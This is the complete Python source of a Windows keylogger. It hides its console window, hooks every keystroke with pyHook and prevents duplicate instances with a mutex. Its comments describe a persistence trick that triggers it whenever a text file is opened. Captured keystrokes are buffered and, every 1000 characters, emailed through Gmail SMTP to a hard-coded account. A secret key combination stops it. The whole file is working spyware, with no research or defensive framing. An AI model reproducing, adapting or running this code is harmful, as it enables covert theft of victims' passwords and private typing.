import smtplib, time, os, threading, sys
import win32console, win32gui, win32event, win32api, winerror
from win32con import VK_CAPITAL
try:
    import pythoncom, pyHook
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print("required pyhook and py2win32")
    exit()

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnStop = "False"

mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key') # exit if there are multiple instances
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()

def hide(): # hide cmd window (optional if compiling as .exe)
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
hide()

# if persistence is installed opening any text file
# will open the keylogger then use this code below
# to open the txt file in notepad
if len(sys.argv) == 2:
    strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
    os.system(strtxtFileCommand)

def OnKeyboardEvent(event):
    global strLogs
    try: # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            else:
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            strMessage = strDateTime + "\n\n" + strLogs
            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
        except:
            # if for some reason, the email cannot send, exit program including threads.
            os._exit(1)

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        # create a new thread so that there is no delay while sending email
        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
        SendMailThread.start()
        exit()

    # if the user types "enter" move to a new line
    if event.Key == "Return":
        strLogs = strLogs + "\n"
    elif event.Key == "Space":
        strLogs = strLogs + " "
    elif event.Key == "Back":
        strLogs = strLogs + " [back] "
    elif event.Key == "Tab":
        strLogs = strLogs + "\t"
    elif event.Key == "Capital":
        pass
    else:
        # check to see if caps lock is on or the shift key is held down
        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
            strLogs = strLogs + event.Key
        else:
            strLogs = strLogs + ((event.Key).lower())

    if len(strLogs) >= 1000:
        # create a new thread so that there is no delay while sending email
        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
        SendMailThread.start()
        strLogs = ""
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
